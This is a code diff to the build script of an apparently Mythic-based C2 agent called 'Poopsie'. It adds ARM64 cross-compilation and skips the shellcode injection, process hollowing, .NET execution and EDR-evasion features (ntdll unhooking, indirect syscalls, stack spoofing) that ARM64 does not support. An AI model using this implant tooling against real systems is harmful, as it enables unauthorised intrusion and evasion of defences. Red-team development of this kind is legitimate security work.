@@ -115,7 +115,7 @@ class Poopsie(PayloadType):
             name="architecture",
             parameter_type=BuildParameterType.ChooseOne,
             description="Target architecture for the payload",
-            choices=["x64", "x86"],
+            choices=["x64", "x86", "arm64"],
             default_value="x64",
             required=True,
         ),
@@ -571,7 +571,13 @@ class Poopsie(PayloadType):
 
             payload_compression = self.get_parameter("payload_compression")
             if not (output_type == "Shellcode" and selected_os == "Windows"):
-                strip_cmd = f"strip {output_path}"
+                if architecture == "arm64" and selected_os == "Windows":
+                    strip_bin = "/opt/llvm-mingw/bin/llvm-strip"
+                elif architecture == "arm64" and selected_os == "Linux":
+                    strip_bin = "aarch64-linux-gnu-strip"
+                else:
+                    strip_bin = "strip"
+                strip_cmd = f"{strip_bin} {output_path}"
                 proc = await asyncio.create_subprocess_shell(
                     strip_cmd,
                     stdout=asyncio.subprocess.PIPE,
@@ -633,7 +639,11 @@ class Poopsie(PayloadType):
                     return resp
                 
                 dll_path = dll_build_result["path"]
-                strip_cmd = f"strip {dll_path}"
+                if architecture == "arm64" and selected_os == "Windows":
+                    strip_bin = "/opt/llvm-mingw/bin/llvm-strip"
+                else:
+                    strip_bin = "strip"
+                strip_cmd = f"{strip_bin} {dll_path}"
                 proc = await asyncio.create_subprocess_shell(
                     strip_cmd,
                     stdout=asyncio.subprocess.PIPE,
@@ -804,7 +814,12 @@ class Poopsie(PayloadType):
             env.update(build_env)
             
             architecture = self.get_parameter("architecture")
-            nim_cpu = "amd64" if architecture == "x64" else "i386"
+            if architecture == "x64":
+                nim_cpu = "amd64"
+            elif architecture == "arm64":
+                nim_cpu = "arm64"
+            else:
+                nim_cpu = "i386"
             
             encrypted_exchange = build_env.get("ENCRYPTED_EXCHANGE_CHECK", "").strip().upper()
             callback_host = build_env.get("CALLBACK_HOST", "").lower()
@@ -813,7 +828,10 @@ class Poopsie(PayloadType):
             needs_openssl_for_exchange = encrypted_exchange in ["T", "TRUE"]
             
             if selected_os == "Windows":
-                needs_openssl_for_transport = (profile == "mtls")
+                needs_openssl_for_transport = (
+                    profile == "mtls" or
+                    (profile == "websocket" and callback_host.startswith("wss://"))
+                )
             else:
                 needs_openssl_for_transport = (
                     callback_host.startswith("https://") or 
@@ -858,7 +876,17 @@ class Poopsie(PayloadType):
 
             if use_openssl:
                 if selected_os == "Windows":
-                    build_messages.append("Static OpenSSL enabled (RSA key exchange + HTTPS/WSS transport, no DLL dependencies)")
+                    if needs_openssl_for_transport:
+                        # mTLS and ws library (wss://) use Nim's SSL module, which requires -d:ssl
+                        # and OpenSSL DLLs on the target (libssl-3-x64.dll, libcrypto-3-x64.dll)
+                        nim_args.append("-d:ssl")
+                        if profile == "mtls":
+                            build_messages.append("OpenSSL enabled for mTLS transport (-d:ssl, requires OpenSSL DLLs on target)")
+                        else:
+                            build_messages.append("OpenSSL enabled for WSS transport (-d:ssl, requires OpenSSL DLLs on target)")
+                    if needs_openssl_for_exchange:
+                        # RSA key exchange on Windows uses BCrypt (native), no OpenSSL needed
+                        build_messages.append("RSA key exchange enabled (native Windows BCrypt API)")
                 elif selected_os == "Linux":
                     nim_args.extend([
                         "-d:ssl",
@@ -877,8 +905,8 @@ class Poopsie(PayloadType):
                     build_messages.append("AESPSK mode (no RSA, standard httpclient)")
             
             if selected_os == "Windows":
-                if callback_host.startswith("https://") or callback_host.startswith("wss://"):
-                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS/WSS transport, no DLLs)")
+                if callback_host.startswith("https://"):
+                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS transport, no DLLs)")
             
             if output_type == "DLL":
                 nim_args.extend([
@@ -893,8 +921,36 @@ class Poopsie(PayloadType):
             
             # Add command compilation flags from Mythic's built-in command selection
             selected_commands = self.commands.get_commands()
-            for cmd in selected_commands:
+
+            # Commands unsupported on ARM64 Windows (x86/x64 inline asm, COFF relocations, CLR hosting, CONTEXT structs)
+            arm64_win_unsupported = {
+                "inline_execute",       # COFF/BOF loader only handles x86/x64 relocations
+                "execute_assembly",     # .NET CLR hosting is x86/x64 only
+                "inject_hollow",        # x86/x64 CONTEXT struct manipulation
+                "spawn",                # x86/x64 CONTEXT struct manipulation
+                "run_pe",               # Extensive x86/x64 PE loader code
+                "shinject",             # x86/x64 shellcode injection
+            }
+            # Commands unsupported on ARM64 regardless of OS
+            arm64_unsupported = {
+                "inline_execute",       # COFF/BOF loader only handles x86/x64 relocations
+            }
+
+            skipped_cmds = []
+            for cmd in sorted(selected_commands):
+                skip = False
+                if architecture == "arm64":
+                    if cmd in arm64_unsupported:
+                        skip = True
+                    elif cmd in arm64_win_unsupported and selected_os == "Windows":
+                        skip = True
+                if skip:
+                    skipped_cmds.append(cmd)
+                    continue
                 nim_args.append(f"-d:cmd_{cmd}")
+
+            if skipped_cmds:
+                build_messages.append(f"Commands skipped (unsupported on {architecture} {selected_os}): {', '.join(skipped_cmds)}")
             
             # Add profile compilation flag
             nim_args.append(f"-d:profile_{profile}")
@@ -906,13 +962,20 @@ class Poopsie(PayloadType):
             # Evasion compile-time defines
             evasion_options = self.get_parameter("evasion") or []
             if selected_os == "Windows" and evasion_options:
-                for evasion in evasion_options:
-                    nim_args.append(f"-d:evasion_{evasion}")
-                build_messages.append(f"Evasion features: {', '.join(evasion_options)}")
-                if "stack_spoof" in evasion_options:
-                    # LTO is incompatible with inline asm used in stack spoofing
-                    nim_args = [a for a in nim_args if a not in ("--passC:-flto", "--passL:-flto")]
-                    build_messages.append("  LTO disabled (incompatible with stack spoof inline asm)")
+                # Evasion features use x86/x64 inline asm — skip on ARM64
+                if architecture == "arm64":
+                    skipped_evasions = [e for e in evasion_options if e in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls", "stack_spoof"}]
+                    evasion_options = [e for e in evasion_options if e not in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls", "stack_spoof"}]
+                    if skipped_evasions:
+                        build_messages.append(f"Evasion skipped (unsupported on ARM64): {', '.join(skipped_evasions)}")
+                if evasion_options:
+                    for evasion in evasion_options:
+                        nim_args.append(f"-d:evasion_{evasion}")
+                    build_messages.append(f"Evasion features: {', '.join(evasion_options)}")
+                    if "stack_spoof" in evasion_options:
+                        # LTO is incompatible with inline asm used in stack spoofing
+                        nim_args = [a for a in nim_args if a not in ("--passC:-flto", "--passL:-flto")]
+                        build_messages.append("  LTO disabled (incompatible with stack spoof inline asm)")
 
             sandbox_delay = self.get_parameter("sandbox_evasion") or "0"
             try:
@@ -933,6 +996,16 @@ class Poopsie(PayloadType):
                         "--gcc.exe:x86_64-w64-mingw32-gcc",
                         "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
                         "--passL:-static"
+                    ])
+                elif architecture == "arm64":
+                    nim_args.extend([
+                        "--os:windows",
+                        "--cpu:arm64",
+                        "--cc:gcc",
+                        "--gcc.exe:aarch64-w64-mingw32-gcc",
+                        "--gcc.linkerexe:aarch64-w64-mingw32-gcc",
+                        "--passL:-static",
+                        "-d:noRes",
                     ])
                 else:
                     nim_args.extend([
@@ -956,6 +1029,15 @@ class Poopsie(PayloadType):
                         "--passL:-m32",
                     ])
                     build_messages.append("Building for Linux x86 (32-bit) with -m32 flag")
+                elif architecture == "arm64":
+                    nim_args.extend([
+                        "--os:linux",
+                        "--cpu:arm64",
+                        "--cc:gcc",
+                        "--gcc.exe:aarch64-linux-gnu-gcc",
+                        "--gcc.linkerexe:aarch64-linux-gnu-gcc",
+                    ])
+                    build_messages.append("Building for Linux ARM64 with aarch64-linux-gnu-gcc")
                 else:
                     nim_args.extend([
                         "--os:linux",
